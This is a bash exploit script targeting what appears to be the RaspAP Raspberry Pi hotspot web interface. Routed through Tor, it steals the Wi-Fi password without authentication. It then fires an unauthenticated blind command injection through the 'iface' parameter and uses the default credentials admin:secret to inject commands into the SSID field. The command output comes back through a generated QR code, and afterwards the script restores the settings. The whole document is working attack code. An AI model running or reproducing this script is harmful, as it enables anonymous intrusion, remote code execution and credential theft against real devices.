echo "Gathering Wifi Password without authentication"

truc=$(torify curl -si  -H "Cookie: PHPSESSID=hey" -H "Referer: lol" $1/app/img/wifi-qr-code.php | grep "X-QR-Code-Content")

echo $truc

name=$(echo $truc | grep -o -P '(?<=WIFI:S:).*(?=;T:)')
echo "" 
echo "Unauthenticated Blind RCE (you need a listener or webhook / you also need to encode space -> %20)"


torify curl -s "$1/ajax/networking/get_netcfg.php?iface=\$($2)" >/dev/null

echo "" 

echo "Well Terrorists win anyway i guess.. check your listener"

echo ""
echo "Trying to RCE with default creds admin:secret"

pass=$(torify curl -s -H "Cookie: PHPSESSID=hey" -u admin:secret $1/index.php?page=hostapd_conf | grep wpa_passphrase | grep -o -P '(?<=value=").*(?=" />)')

csrf=$(torify curl -s -H "Cookie: PHPSESSID=hey" -u admin:secret $1/index.php?page=hostapd_conf | grep csrf | grep -o -P '(?<=value=").*(?=">)')
echo ""
echo "Wifi Password : $pass"

echo "CSRF Token :$csrf"
echo ""


if [[ $csrf == "" ]] ; then

echo "Login Failed"
echo "Counter-Terrorist Win (No authenticated RCE with fun output :p)"
exit

fi

torify curl -s -u admin:secret -H "Cookie: PHPSESSID=hey" -X POST $1/index.php?page=hostapd_conf -d "csrf_token=$csrf&interface=wlan0&ssid=raspi-webgui\$($2)&hw_mode=g&channel=1&wpa=2&wpa_pairwise=CCMP&wpa_passphrase=$pass&beaconintervalEnable=1&beacon_interval=100&max_num_sta=&country_code=FR&SaveHostAPDSettings=Save+settings" >/dev/null

echo "The Bomb as been planted"

torify curl -s -u admin:secret -H "Cookie: PHPSESSID=hey" -H "Referer: muchprotection" $1/app/img/wifi-qr-code.php > Boom.svg

inkscape --export-type="png" Boom.svg 2>/dev/null

echo "BOOM !!"
echo ""
zbarimg --raw Boom.png 
echo ""
echo "Terrorists Win"


echo "Defusing.."

rm Boom.*

torify curl -s -u admin:secret -H "Cookie: PHPSESSID=hey" -X POST $1/index.php?page=hostapd_conf -d "csrf_token=$csrf&interface=wlan0&ssid=$name&hw_mode=g&channel=1&wpa=2&wpa_pairwise=CCMP&wpa_passphrase=$pass&beaconintervalEnable=1&beacon_interval=100&max_num_sta=&country_code=FR&SaveHostAPDSettings=Save+settings" >/dev/null







